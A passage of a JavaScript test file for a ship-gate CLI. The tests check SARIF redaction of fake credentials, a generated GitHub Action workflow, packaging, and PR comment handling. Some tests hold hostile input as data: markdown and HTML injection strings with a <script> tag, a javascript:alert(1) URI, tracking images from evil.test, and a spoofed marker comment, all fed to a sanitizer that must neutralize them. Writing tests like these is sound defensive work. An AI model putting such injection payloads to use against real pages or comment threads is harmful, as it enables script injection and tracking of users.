    // Message redacted (fingerprint form, not full secret)
    const msg = JSON.stringify(secretResults);
    assert.ok(!msg.includes(secret));
    assert.ok(/…|\.\.\.|redact|chars|auth/i.test(msg), `expected fingerprint/auth style message: ${msg}`);
    assert.equal(sarif.runs[0].invocations[0].exitCode, 1, "invocation exit stays NO-GO");
  } finally {
    cleanup(base);
  }
});

scenario("sarif: non-security failure has no security-severity/security tag; secret still has both", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Dirty tracked file → non-security ship-gate finding (quality/reliability).
    write(repo, "app.js", "console.log('dirty');\n");
    // Do NOT commit — leave working tree dirty so dirty-tree fails.
    const secret = "sk_live_" + "SECQUALITYSPLIT0000000001";
    write(repo, "src/also-secret.js", `export const k = "${secret}";\n`);
    commitAll(repo, "chore: commit secret for dual classification");
    // Make a dirty modification after commit so dirty-tree also fires.
    write(repo, "app.js", "console.log('still dirty after commit');\n");

    const out = path.join(repo, "classify.sarif");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 1, `must NO-GO:\n${r.stderr}\n${r.stdout}`);
    const raw = readFileSync(out, "utf8");
    assert.ok(!raw.includes(secret), "fixture secret absent from entire SARIF");
    const sarif = JSON.parse(raw);
    const rules = sarif.runs[0].tool.driver.rules || [];
    assert.ok(rules.length >= 1, "expected rules");

    const secretRules = rules.filter((rr) => String(rr.id).startsWith("secret/"));
    assert.ok(secretRules.length >= 1, `expected secret/* rules: ${rules.map((x) => x.id)}`);
    for (const rr of secretRules) {
      assert.ok(
        rr.properties?.["security-severity"],
        `secret ${rr.id} must have security-severity`,
      );
      assert.ok(
        rr.properties?.tags?.includes("security"),
        `secret ${rr.id} must tag security`,
      );
      assert.equal(
        rr.properties?.["problem.severity"],
        undefined,
        `secret ${rr.id} should not use problem.severity`,
      );
    }

    // Non-security rules: dirty-tree, typecheck-style, etc. — anything not secret/tracked-env
    const nonSec = rules.filter(
      (rr) =>
        !String(rr.id).startsWith("secret/") &&
        rr.id !== "check/tracked-env-file" &&
        !String(rr.id).startsWith("check/tracked-env"),
    );
    // Dirty tree should produce at least one non-security rule when dirty.
    assert.ok(
      nonSec.length >= 1,
      `expected ≥1 non-security rule from dirty tree; rules=${rules.map((x) => x.id).join(",")}`,
    );
    for (const rr of nonSec) {
      assert.equal(
        rr.properties?.["security-severity"],
        undefined,
        `non-security ${rr.id} must NOT have security-severity (would create fake security alerts)`,
      );
      assert.ok(
        !rr.properties?.tags?.includes("security"),
        `non-security ${rr.id} must NOT have security tag: ${JSON.stringify(rr.properties?.tags)}`,
      );
      assert.ok(
        rr.properties?.["problem.severity"],
        `non-security ${rr.id} must use problem.severity`,
      );
      assert.ok(
        rr.properties?.tags?.some((t) => t === "quality" || t === "reliability"),
        `non-security ${rr.id} should tag quality/reliability: ${JSON.stringify(rr.properties?.tags)}`,
      );
    }
  } finally {
    cleanup(base);
  }
});

scenario("sarif: malformed/empty path fails honestly; does not flip prior NO-GO to success", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Empty path (flag present, no value)
    const r0 = run(["check", "--no-brief-check", "--no-overview", "--sarif"], repo);
    assert.equal(r0.code, 1, `empty --sarif must fail:\n${r0.stderr}\n${r0.stdout}`);
    assert.ok(/SARIF|path|file/i.test(r0.stderr + r0.stdout), `must explain path:\n${r0.stderr}\n${r0.stdout}`);

    // Path is an existing directory → write fails
    const dir = path.join(repo, "sarif-dir");
    mkdirSync(dir, { recursive: true });
    const r1 = run(["check", "--no-brief-check", "--no-overview", "--sarif", dir], repo);
    assert.equal(r1.code, 1, `directory path must fail:\n${r1.stderr}`);
    assert.ok(/SARIF|write|path|directory|EISDIR|not a file/i.test(r1.stderr + r1.stdout), r1.stderr);

    // Clean GO + bad SARIF path + --json: process exit 1 AND JSON must not claim GO/0
    const rGoBad = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", dir], repo);
    assert.equal(rGoBad.code, 1, `clean GO + bad SARIF path must exit 1:\n${rGoBad.stderr}`);
    const docGoBad = JSON.parse(rGoBad.stdout);
    assert.equal(docGoBad.exitCode, 1, "JSON exitCode must match final CLI exit (not frozen gate GO)");
    assert.equal(docGoBad.verdict, "NO-GO", "JSON verdict must match final CLI outcome");

    // Secret NO-GO + bad path: still exit 1 (never success)
    const secret = "sk_live_" + "PATHFAILSECRET00000000001";
    write(repo, "bad.js", `const x="${secret}";\n`);
    commitAll(repo, "chore: secret + bad sarif path");
    const r2 = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", dir], repo);
    assert.equal(r2.code, 1, "NO-GO + SARIF write fail must stay non-zero");
    const doc = JSON.parse(r2.stdout);
    assert.equal(doc.verdict, "NO-GO");
    assert.equal(doc.exitCode, 1);
    assert.ok(!JSON.stringify(doc).includes(secret));
  } finally {
    cleanup(base);
  }
});

scenario("sarif: unicode + special filename URIs are percent-encoded; multi secrets; stable rule ids", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const s1 = "sk_live_" + "MULTISECRETAAAA1111111111";
    const s2 = "ghp_" + "A".repeat(36);
    const s3 = "sk_live_" + "SPECIALPCTAMP00000000001";
    write(repo, "geheime Datei über prod.txt", `key=${s1}\n`);
    write(repo, "other/token#frag.js", `export const t = "${s2}";\n`);
    // Legitimate special chars: space, #, %, &, =, Unicode — must round-trip via percent-encoding.
    write(repo, "cfg/a%b&c=d.js", `export const k = "${s3}";\n`);
    commitAll(repo, "chore: unicode + multi secrets");
    const out = path.join(repo, "multi.sarif");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 1);
    const raw = readFileSync(out, "utf8");
    assert.ok(!raw.includes(s1) && !raw.includes(s2) && !raw.includes(s3), "fixture secrets absent from SARIF");
    const sarif = JSON.parse(raw);
    const results = sarif.runs[0].results.filter((x) => String(x.ruleId).startsWith("secret/"));
    assert.ok(results.length >= 3, `expected ≥3 secret results, got ${results.length}: ${JSON.stringify(results)}`);
    const ids = new Set(results.map((x) => x.ruleId));
    assert.ok(ids.has("secret/stripe-live"), `missing stripe-live: ${[...ids]}`);
    assert.ok(ids.has("secret/github-pat"), `missing github-pat: ${[...ids]}`);
    // Artifact URIs must be valid references: no raw spaces; unicode/special percent-encoded.
    const uris = results
      .map((x) => x.locations?.[0]?.physicalLocation?.artifactLocation?.uri || "")
      .filter(Boolean);
    assert.ok(uris.length >= 1, "expected artifact locations");
    for (const u of uris) {
      assert.ok(!/\s/.test(u), `URI must not contain raw whitespace: ${u}`);
      assert.ok(!u.includes("#"), `URI must encode #: ${u}`);
      // Raw unencoded specials in a path segment would be ambiguous URI refs.
      assert.ok(!u.split("/").some((seg) => /[%&=]/.test(seg) && !/%[0-9A-Fa-f]{2}/.test(seg)),
        `URI segments with %, &, = must be percent-encoded: ${u}`);
    }
    const decoded = uris
      .map((u) => {
        try {
          return decodeURIComponent(u);
        } catch {
          return u;
        }
      })
      .join("\n");
    assert.ok(/über|geheime/i.test(decoded), `unicode path expected after decode:\n${uris.join("\n")}`);
    assert.ok(
      uris.some((u) => /%20|%C3%BC|geheime/i.test(u)),
      `expected percent-encoding for space/unicode: ${uris.join(" | ")}`,
    );
    // Round-trip: % & = in legitimate filenames survive encode → decode.
    assert.ok(
      uris.some((u) => {
        try {
          const d = decodeURIComponent(u);
          return d.includes("a%b&c=d.js") || /a%b&c=d/.test(d);
        } catch {
          return false;
        }
      }) || decoded.includes("a%b&c=d"),
      `expected percent-encoded special filename a%b&c=d.js in URIs:\n${uris.join("\n")}`,
    );
  } finally {
    cleanup(base);
  }
});

scenario("sarif: credential-shaped filename must not appear in artifactLocation.uri or full SARIF", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Filename IS the credential (P1: naive URI encode would upload the full token).
    const pathCred = "sk_live_" + "PATHLEAKFILENAME00000001";
    const contentCred = "sk_live_" + "CONTENTONLYSECRET0000001";
    const leakName = pathCred + ".js";
    write(repo, path.join("src", leakName), `export const k = "${contentCred}";\n`);
    commitAll(repo, "chore: secret-shaped filename");
    const out = path.join(repo, "path-leak.sarif");
    const r = run(["check", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 1, `must NO-GO on content secret:\n${r.stderr}\n${r.stdout}`);
    assert.ok(existsSync(out), "SARIF must be written");
    const raw = readFileSync(out, "utf8");
    // Exact path credential must be absent from the entire serialization (not just messages).
    assert.ok(!raw.includes(pathCred), `path credential must not appear anywhere in SARIF:\n${raw.slice(0, 400)}`);
    assert.ok(!raw.includes(contentCred), "content credential must not appear in SARIF");
    assert.ok(!raw.includes(leakName), "credential-shaped filename must not appear in SARIF");
    const sarif = JSON.parse(raw);
    const secretResults = (sarif.runs[0].results || []).filter((x) => String(x.ruleId).startsWith("secret/"));
    assert.ok(secretResults.length >= 1, "must still emit secret finding (content)");
    // Location omitted when path is credential-shaped — no fake redacted path.
    for (const res of secretResults) {
      const uri = res.locations?.[0]?.physicalLocation?.artifactLocation?.uri;
      if (uri) {
        assert.ok(!uri.includes(pathCred), `uri must not contain path credential: ${uri}`);
        assert.ok(!decodeURIComponent(uri).includes(pathCred), `decoded uri must not contain path credential: ${uri}`);
      }
    }
    // Prefer omit: if every secret result lacks a location pointing at the leaky name, that is correct.
    const anyLeakyUri = secretResults.some((res) => {
      const uri = res.locations?.[0]?.physicalLocation?.artifactLocation?.uri || "";
      return uri.includes("PATHLEAK") || uri.includes(pathCred) || /sk_live_/.test(uri);
    });
    assert.ok(!anyLeakyUri, "no secret result may expose sk_live_ material in artifact URI");
  } finally {
    cleanup(base);
  }
});

scenario("sarif: build stdout with credentials never reaches SARIF (no generic extra dump)", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Hostile fixture values that must never appear in the full SARIF serialization.
    const sk = "sk_live_" + "BUILDSTDOUTLEAK000000001";
    const bearer = "Bearer " + "b".repeat(40);
    const dbUrl = "postgres://user:SuperSecretPass99@db.example.com:5432/app";
    const tokenUrl = "https://api.example.com/v1?token=" + sk;
    // Failing build that prints credential-shaped stdout (classic false path into SARIF).
    write(
      repo,
      "package.json",
      JSON.stringify(
        {
          name: "build-leak",
          version: "1.0.0",
          scripts: {
            build:
              `node -e "console.log(${JSON.stringify(tokenUrl)}); console.log(${JSON.stringify(bearer)}); console.log(${JSON.stringify(dbUrl)}); process.exit(1)"`,
          },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: failing build with secret-shaped stdout");
    const out = path.join(repo, "build-leak.sarif");
    const r = run(["check", "--build", "--json", "--no-brief-check", "--no-overview", "--sarif", out], repo);
    assert.equal(r.code, 1, `build fail must NO-GO:\n${r.stderr}\n${r.stdout}`);
    assert.ok(existsSync(out), "SARIF must still be written on NO-GO");
    const raw = readFileSync(out, "utf8");
    for (const leak of [sk, bearer, "SuperSecretPass99", tokenUrl, dbUrl]) {
      assert.ok(!raw.includes(leak), `SARIF must not contain build stdout credential: ${leak.slice(0, 24)}…`);
    }
    const sarif = JSON.parse(raw);
    const rules = sarif.runs[0].tool.driver.rules || [];
    const buildRules = rules.filter((rr) => /build/i.test(rr.id) || /build/i.test(rr.name || ""));
    // Build failures are quality, not security alerts
    for (const rr of buildRules) {
      assert.equal(rr.properties?.["security-severity"], undefined, `build rule ${rr.id} must not be security`);
      assert.ok(!rr.properties?.tags?.includes("security"), `build rule ${rr.id} must not tag security`);
    }
    // Messages should be summaries only — not multi-line compiler dumps with fixtures
    const msgs = (sarif.runs[0].results || []).map((x) => x.message?.text || "").join("\n");
    assert.ok(!msgs.includes(sk) && !msgs.includes("SuperSecretPass99"));
  } finally {
    cleanup(base);
  }
});

scenario("github-action: generates first-party Action workflow; idempotent; refuses differing without --force", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const wf = path.join(repo, ".github", "workflows", "getadvantage.yml");
    const r1 = run(["github-action"], repo);
    assert.equal(r1.code, 0, r1.stderr + r1.stdout);
    assert.ok(existsSync(wf), "workflow must be written");
    const body1 = readFileSync(wf, "utf8");
    // First-party Action one-copy install
    assert.ok(
      /uses:\s*BellmeJoe\/getadvantage-cli@v1/.test(body1),
      "must consume first-party Action @v1",
    );
    assert.ok(!/npx --yes getadvantage@/.test(body1), "consumer workflow must not inline opaque npx pin steps");
    assert.ok(/actions\/checkout@v6/.test(body1), "must pin actions/checkout@v6 (GitHub SARIF docs)");
    assert.ok(/security-events:\s*write/.test(body1), "needs security-events: write");
    assert.ok(/contents:\s*read/.test(body1), "needs contents: read");
    assert.ok(
      /actions:\s*read/.test(body1),
      "needs actions: read (required for private-repository workflows per GitHub docs)",
    );
    assert.ok(/pull-requests:\s*write/.test(body1), "needs pull-requests: write for same-repo PR comments");
    assert.ok(
      !/^[^#\n]*pull_request_target/m.test(body1) && !/\bon:\s*[\s\S]*pull_request_target/.test(body1),
      "must never wire pull_request_target as a workflow trigger",
    );
    assert.ok(/Code Security/i.test(body1), "workflow comments must state private repos need Code Security");
    assert.ok(/fetch-depth:\s*0/.test(body1), "full history for base comparison");

    // Root action.yml carries upload-sarif + setup-node pins + upload honesty
    const actionYml = readFileSync(path.join(__dirname, "..", "action.yml"), "utf8");
    assert.ok(/upload-sarif@v4/.test(actionYml), "action.yml must pin upload-sarif@v4");
    assert.ok(!/upload-sarif@v3/.test(actionYml), "must not pin stale upload-sarif@v3");
    assert.ok(/actions\/setup-node@v6/.test(actionYml), "action.yml must pin setup-node@v6");
    assert.ok(/node-version:.*20|default:\s*"20"/.test(actionYml), "Node 20 default");
    assert.ok(/continue-on-error:\s*true/.test(actionYml), "gate continue-on-error for NO-GO upload path");
    assert.ok(/if:\s*always\(\)/.test(actionYml), "upload/enforce use always()");
    assert.ok(/Fail job on NO-GO|SARIF upload failure/i.test(actionYml), "final step retains verdict + upload honesty");
    assert.ok(/id:\s*sarif_upload/.test(actionYml), "upload step must have id for outcome check");
    assert.ok(/sarif-upload-eligible/.test(actionYml), "upload gated on eligibility (fork skip)");
    assert.ok(/GETADVANTAGE_UPLOAD_OUTCOME|sarif_upload\.outcome/.test(actionYml), "enforce observes upload outcome");
    assert.ok(/action\/enforce\.mjs/.test(actionYml), "enforce.mjs drives final required-check");
    assert.ok(/action\/install\.mjs/.test(actionYml), "install via trusted scrubbed install.mjs");
    assert.ok(/fork/i.test(actionYml), "documents honest fork skip");

    // Idempotent re-run
    const r2 = run(["github-action"], repo);
    assert.equal(r2.code, 0, r2.stderr);
    assert.ok(/already in place|up to date|nothing changed/i.test(r2.stdout + r2.stderr));
    assert.equal(readFileSync(wf, "utf8"), body1, "idempotent: content unchanged");

    // Differing file without --force refuses
    writeFileSync(wf, body1 + "\n# hand edit\n", "utf8");
    const r3 = run(["github-action"], repo);
    assert.equal(r3.code, 1, "must refuse overwrite without --force");
    assert.ok(/differs|not overwriting|--force/i.test(r3.stderr + r3.stdout));
    assert.ok(readFileSync(wf, "utf8").includes("# hand edit"), "user file preserved");

    // --force replaces
    const r4 = run(["github-action", "--force"], repo);
    assert.equal(r4.code, 0, r4.stderr);
    assert.equal(readFileSync(wf, "utf8"), body1);

    // Legacy 0.8.4-style inline workflow: refuse without --force; migrate with --force
    const legacy = `# Generated by \`getadvantage github-action\`.
name: getAdvantage check
on: [push, pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npx --yes getadvantage@0.8.4 check --ci --sarif getadvantage.sarif
      - uses: github/codeql-action/upload-sarif@v4
        with:
          sarif_file: getadvantage.sarif
`;
    writeFileSync(wf, legacy, "utf8");
    const r5 = run(["github-action"], repo);
    assert.equal(r5.code, 1, "legacy must not be silently clobbered");
    assert.ok(/pre-0\.9\.0|migrate|--force/i.test(r5.stderr + r5.stdout), r5.stderr + r5.stdout);
    assert.equal(readFileSync(wf, "utf8"), legacy, "legacy preserved without --force");
    const r6 = run(["github-action", "--force"], repo);
    assert.equal(r6.code, 0, r6.stderr);
    assert.equal(readFileSync(wf, "utf8"), body1);
    assert.ok(/Migrated|first-party/i.test(r6.stdout + r6.stderr));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 38. packed-package cold path for SARIF (0.8.4)
// ---------------------------------------------------------------------------
scenario("packed package: tarball includes sarif.mjs; cold install writes parseable SARIF", () => {
  const base = freshBase();
  try {
    const pkgRoot = path.join(__dirname, "..");
    const packDir = path.join(base, "pack");
    mkdirSync(packDir, { recursive: true });
    // npm pack into packDir
    execFileSync("npm", ["pack", pkgRoot, "--pack-destination", packDir], {
      cwd: packDir,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const tgz = path.join(packDir, readdirPack(packDir));
    assert.ok(tgz && existsSync(tgz), `expected a tarball in ${packDir}`);

    // Inspect tarball listing for serializer + runtime files
    const listing = execFileSync("tar", ["-tzf", tgz], { encoding: "utf8" });
    const must = [
      "package/sarif.mjs",
      "package/action.mjs",
      "package/checks.mjs",
      "package/index.mjs",
      "package/package.json",
    ];
    for (const m of must) {
      assert.ok(listing.includes(m) || listing.replace(/\\/g, "/").includes(m), `tarball missing ${m}:\n${listing.slice(0, 500)}`);
    }

    // Cold install + run outside source tree
    const cold = path.join(base, "cold");
    mkdirSync(cold, { recursive: true });
    execFileSync("npm", ["install", "--ignore-scripts", tgz], {
      cwd: cold,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const bin = path.join(cold, "node_modules", "getadvantage", "index.mjs");
    assert.ok(existsSync(bin), "packed index.mjs must install");
    assert.ok(existsSync(path.join(cold, "node_modules", "getadvantage", "sarif.mjs")), "sarif.mjs must install");

    const sample = path.join(base, "sample-repo");
    initRepo(sample);
    write(sample, "package.json", '{"name":"cold-sarif","version":"1.0.0"}\n');
    write(sample, "app.js", "console.log('ok');\n");
    commitAll(sample, "chore: cold clean");
    const out = path.join(sample, "cold.sarif");
    const r = spawnSync(process.execPath, [bin, "check", "--no-brief-check", "--no-overview", "--sarif", out], {
      cwd: sample,
      encoding: "utf8",
      env: buildEnv(),
      timeout: 120_000,
    });
    assert.equal(r.status, 0, `cold clean GO:\n${r.stderr}\n${r.stdout}`);
    const sarif = JSON.parse(readFileSync(out, "utf8"));
    assert.equal(sarif.version, "2.1.0");
    assert.equal(sarif.runs[0].tool.driver.name, "getAdvantage");

    // Hostile secret on cold path
    const secret = "sk_live_" + "COLDPACKSECRET00000000001";
    write(sample, "leak.js", `export const k="${secret}";\n`);
    commitAll(sample, "chore: cold secret");
    const out2 = path.join(sample, "cold-nogo.sarif");
    const r2 = spawnSync(
      process.execPath,
      [bin, "check", "--json", "--no-brief-check", "--no-overview", "--sarif", out2],
      { cwd: sample, encoding: "utf8", env: buildEnv(), timeout: 120_000 },
    );
    assert.equal(r2.status, 1, `cold secret NO-GO:\n${r2.stderr}\n${r2.stdout}`);
    const raw2 = readFileSync(out2, "utf8");
    assert.ok(!raw2.includes(secret), "cold SARIF must not contain fixture secret");
    const s2 = JSON.parse(raw2);
    assert.ok(s2.runs[0].results.some((x) => x.ruleId === "secret/stripe-live"));
  } finally {
    cleanup(base);
  }
});

function readdirPack(dir) {
  const names = readdirSync(dir).filter((n) => n.endsWith(".tgz"));
  assert.ok(names.length >= 1, `no .tgz in ${dir}`);
  return names[0];
}

// ---------------------------------------------------------------------------
// 39–40. first-party GitHub Action + PR summary + repair hostiles (0.9.0)
// ---------------------------------------------------------------------------
scenario("action summary: marker, redaction, injection, credential-shaped paths", async () => {
  const {
    PR_SUMMARY_MARKER,
    buildSummaryMarkdown,
    sanitizeSummaryText,
    isUnsafePathForSummary,
    findMarkerComment,
    isBotOwnedMarkerComment,
    upsertPrComment,
    writeJobSummary,
    COMMENT_PAGE_SIZE,
  } = await import(pathToFileURL(path.join(__dirname, "..", "action", "summary.mjs")).href);
  const { redactForSarif } = await import(pathToFileURL(path.join(__dirname, "..", "sarif.mjs")).href);

  assert.ok(PR_SUMMARY_MARKER.includes("getadvantage:pr-summary"));

  // Clean GO summary
  const go = buildSummaryMarkdown({
    verdict: "GO",
    exitCode: 0,
    checks: [{ status: "pass", label: "Secret scan", detail: "clean" }],
    version: "0.9.0",
    runUrl: "https://github.com/BellmeJoe/getadvantage-cli/actions/runs/1",
  });
  assert.ok(go.startsWith(PR_SUMMARY_MARKER));
  assert.ok(/\*\*GO\*\*/.test(go));
  assert.ok(!go.includes("sk_live_"));

  // Secret NO-GO — full secret never in body
  const secret = "sk_live_" + "HOSTILESUMMARYSECRET0000001";
  const nogo = buildSummaryMarkdown({
    verdict: "NO-GO",
    exitCode: 1,
    checks: [
      {
        status: "fail",
        label: "Secret scan",
        detail: `found ${secret} in app.js`,
        findings: [{ file: "app.js", fp: "sk_live_…0001 (40 chars)", patternId: "stripe-live" }],
      },
    ],
    version: "0.9.0",
  });
  assert.ok(/\*\*NO-GO\*\*/.test(nogo));
  assert.ok(!nogo.includes(secret), "summary must not contain full secret");
  assert.ok(nogo.includes("app.js") || nogo.includes("Secret scan"));

  // Injected markdown / control characters / images / HTML / mentions / unsafe URI
  const injected = sanitizeSummaryText(
    "ok\u0000\u0007 <!-- inject --> ![x](https://evil.test/p.png) <script>x</script> @victim " +
      "javascript:alert(1) secret\nsk_live_ABCDEFGHIJKLMNOPQRSTUV",
  );
  assert.ok(!injected.includes("\u0000") && !injected.includes("\u0007"));
  assert.ok(!injected.includes("<!--"), "must break HTML comment openers");
  assert.ok(!injected.includes("-->"), "must break HTML comment terminators");
  assert.ok(!/sk_live_ABCDEFGHIJKLMNOPQRSTUV/.test(injected), "credential redacted");
  assert.ok(!/!\[/.test(injected), "markdown images neutralized");
  assert.ok(!/<script/i.test(injected), "HTML tags stripped");
  assert.ok(!/@victim\b/.test(injected), "mentions neutralized");
  assert.ok(!/javascript:/i.test(injected), "unsafe URI neutralized");

  // Reference-style images + definitions must be neutralized (not only inline).
  const refStyle = sanitizeSummaryText(
    "see ![badge][evilimg] and chart\n\n[evilimg]: https://evil.test/track.png\n[js]: javascript:alert(1)\n",
  );
  assert.ok(!/!\[/.test(refStyle), "reference-style images neutralized");
  assert.ok(!/evil\.test/.test(refStyle), "reference definitions dropped");
  assert.ok(!/javascript:/i.test(refStyle), "js reference definition dropped");

  // Central redaction: ghs_ / Bearer / DB URL with password
  const ghs = "ghs_" + "A".repeat(36);
  const bearer = "Bearer " + "xyzSECRETTOKENVALUE99";
  const dbUrl = "postgres://app:SuperSecretPass99@db.example.com:5432/prod";
  const redBlob = redactForSarif(`tok=${ghs} hdr=${bearer} url=${dbUrl}`);
  assert.ok(!redBlob.includes(ghs), "ghs_ token redacted");
  assert.ok(!redBlob.includes("SuperSecretPass99"), "DB password redacted");
  assert.ok(!redBlob.includes("xyzSECRETTOKENVALUE99"), "Bearer token redacted");
  assert.ok(/ghs_…\[redacted\]|Bearer …\[redacted\]|…\[redacted\]@/.test(redBlob), redBlob);

  // Credential-shaped filenames (ghs_ and sk_live_) omitted, not fake-redacted
  const badName = "sk_live_FILENAMESECRET000000001.js";
  const ghsName = "ghs_" + "B".repeat(36) + ".js";
  assert.equal(isUnsafePathForSummary(badName), true);
  assert.equal(isUnsafePathForSummary(ghsName), true);
  const pathOmit = buildSummaryMarkdown({
    verdict: "NO-GO",
    exitCode: 1,
    checks: [
      {
        status: "fail",
        label: "Secret scan",
        detail: "leak",
        findings: [{ file: badName, fp: "sk_live_…0001 (36 chars)" }],
      },
    ],
  });
  assert.ok(!pathOmit.includes(badName), "credential-shaped filename must not appear");
  assert.ok(/path omitted|credential-shaped/i.test(pathOmit));

  // Update-in-place: second upsert PATCHes existing bot marker (no duplicate POST)
  const bot = { login: "github-actions[bot]", type: "Bot" };
  const store = { comments: [], posts: 0, patches: 0, listCalls: 0 };
  const fetchImpl = async (url, init = {}) => {
    const method = (init.method || "GET").toUpperCase();
    if (method === "GET" && /\/user$/.test(url)) {
      return { ok: true, status: 200, json: async () => ({ login: bot.login }) };
    }
    if (method === "GET" && /\/comments\?/.test(url)) {
      store.listCalls += 1;
      const u = new URL(url, "https://api.github.com");
      const page = Number(u.searchParams.get("page") || "1");
      const per = Number(u.searchParams.get("per_page") || String(COMMENT_PAGE_SIZE));
      const start = (page - 1) * per;
      const slice = store.comments.slice(start, start + per);
      return { ok: true, status: 200, json: async () => slice };
    }
    if (method === "POST" && /\/comments$/.test(url)) {
      store.posts += 1;
      const body = JSON.parse(init.body).body;
      const id = 100 + store.posts;
      store.comments.push({ id, body, user: bot });
      return { ok: true, status: 201, json: async () => ({ id, body, user: bot }) };
    }
    if (method === "PATCH" && /\/comments\/(\d+)$/.test(url)) {
      store.patches += 1;
      const id = Number(url.match(/\/comments\/(\d+)$/)[1]);
      const body = JSON.parse(init.body).body;
      const idx = store.comments.findIndex((c) => c.id === id);
      if (idx >= 0) store.comments[idx] = { ...store.comments[idx], id, body };
      return { ok: true, status: 200, json: async () => ({ id, body }) };
    }
    return { ok: false, status: 500, json: async () => ({}) };
  };

  const body1 = buildSummaryMarkdown({ verdict: "GO", exitCode: 0, checks: [], version: "0.9.0" });
  const u1 = await upsertPrComment({
    token: "ghs_" + "C".repeat(36),
    owner: "o",
    repo: "r",
    issueNumber: 7,
    body: body1,
    actorLogin: bot.login,
    fetchImpl,
  });
  assert.equal(u1.ok, true);
  assert.equal(u1.action, "created");
  assert.equal(store.posts, 1);
  assert.equal(store.patches, 0);

  const body2 = buildSummaryMarkdown({ verdict: "NO-GO", exitCode: 1, checks: [], version: "0.9.0" });
  const u2 = await upsertPrComment({
    token: "ghs_" + "C".repeat(36),
    owner: "o",
    repo: "r",
    issueNumber: 7,
    body: body2,
    actorLogin: bot.login,
    fetchImpl,
  });
  assert.equal(u2.ok, true);
  assert.equal(u2.action, "updated");
  assert.equal(store.posts, 1, "rerun must not create a second comment");
  assert.equal(store.patches, 1);
  assert.equal(store.comments.length, 1);
  assert.ok(store.comments[0].body.includes("NO-GO"));
  assert.ok(findMarkerComment(store.comments, bot.login));

  // --- page-2 bot marker must update (pagination) ---
  const store2 = { comments: [], posts: 0, patches: 0 };
  // Fill page 1 with non-marker noise, put bot marker on page 2
  for (let i = 0; i < COMMENT_PAGE_SIZE; i++) {
    store2.comments.push({ id: 1000 + i, body: `noise ${i}`, user: { login: "human", type: "User" } });
  }
  const page2Id = 9999;
  store2.comments.push({
    id: page2Id,
    body: PR_SUMMARY_MARKER + "\n### getAdvantage check\n\n**GO**\n",
    user: bot,
  });
  const fetchPage2 = async (url, init = {}) => {
    const method = (init.method || "GET").toUpperCase();
    if (method === "GET" && /\/user$/.test(url)) {
      return { ok: true, status: 200, json: async () => ({ login: bot.login }) };
    }
    if (method === "GET" && /\/comments\?/.test(url)) {
      const u = new URL(url, "https://api.github.com");
      const page = Number(u.searchParams.get("page") || "1");
      const per = Number(u.searchParams.get("per_page") || String(COMMENT_PAGE_SIZE));
      const start = (page - 1) * per;
      return { ok: true, status: 200, json: async () => store2.comments.slice(start, start + per) };
    }
    if (method === "PATCH" && /\/comments\/(\d+)$/.test(url)) {
      store2.patches += 1;
      const id = Number(url.match(/\/comments\/(\d+)$/)[1]);
      assert.equal(id, page2Id, "must PATCH the page-2 bot marker, not invent a new id");
      const body = JSON.parse(init.body).body;
      const idx = store2.comments.findIndex((c) => c.id === id);
      store2.comments[idx] = { ...store2.comments[idx], body };
      return { ok: true, status: 200, json: async () => ({ id, body }) };
    }
    if (method === "POST") {
      store2.posts += 1;
      return { ok: true, status: 201, json: async () => ({ id: 1 }) };
    }
    return { ok: false, status: 500, json: async () => ({}) };
  };
  const uPage2 = await upsertPrComment({
    token: "ghs_" + "D".repeat(36),
    owner: "o",
    repo: "r",
    issueNumber: 11,
    body: body2,
    actorLogin: bot.login,
    fetchImpl: fetchPage2,
  });
  assert.equal(uPage2.ok, true);
  assert.equal(uPage2.action, "updated");
  assert.equal(uPage2.id, page2Id);
  assert.equal(store2.posts, 0, "page-2 marker must not POST a duplicate");
  assert.equal(store2.patches, 1);

  // --- spoofed user marker must NOT be patched; POST a new bot comment instead ---
  const store3 = { comments: [], posts: 0, patches: 0, patchedIds: [] };
  store3.comments.push({
    id: 42,
    body: PR_SUMMARY_MARKER + "\nspoofed by human",
    user: { login: "evil-user", type: "User" },
  });
  const fetchSpoof = async (url, init = {}) => {
    const method = (init.method || "GET").toUpperCase();
    if (method === "GET" && /\/user$/.test(url)) {
      return { ok: true, status: 200, json: async () => ({ login: bot.login }) };
    }
    if (method === "GET" && /\/comments\?/.test(url)) {
      return { ok: true, status: 200, json: async () => store3.comments.slice() };
    }
    if (method === "PATCH") {
      store3.patches += 1;
      store3.patchedIds.push(Number(url.match(/\/comments\/(\d+)/)[1]));
      // Spoofed would 403 if we tried — simulate that failure mode
      return { ok: false, status: 403, json: async () => ({ message: "Resource not accessible by integration" }) };
    }
    if (method === "POST" && /\/comments$/.test(url)) {
      store3.posts += 1;
      const body = JSON.parse(init.body).body;
      const id = 77;
      store3.comments.push({ id, body, user: bot });
      return { ok: true, status: 201, json: async () => ({ id, body, user: bot }) };
    }
    return { ok: false, status: 500, json: async () => ({}) };
  };
  assert.equal(isBotOwnedMarkerComment(store3.comments[0], bot.login), false);
  const uSpoof = await upsertPrComment({
    token: "ghs_" + "E".repeat(36),
    owner: "o",
    repo: "r",
    issueNumber: 12,
    body: body1,
    actorLogin: bot.login,
    fetchImpl: fetchSpoof,
  });
  assert.equal(uSpoof.ok, true);
  assert.equal(uSpoof.action, "created");
  assert.equal(store3.patches, 0, "must never PATCH a spoofed user marker");
  assert.equal(store3.posts, 1);
  assert.equal(uSpoof.id, 77);

  // Missing PR write permission → not ok (caller falls back to job summary)
  const denied = await upsertPrComment({
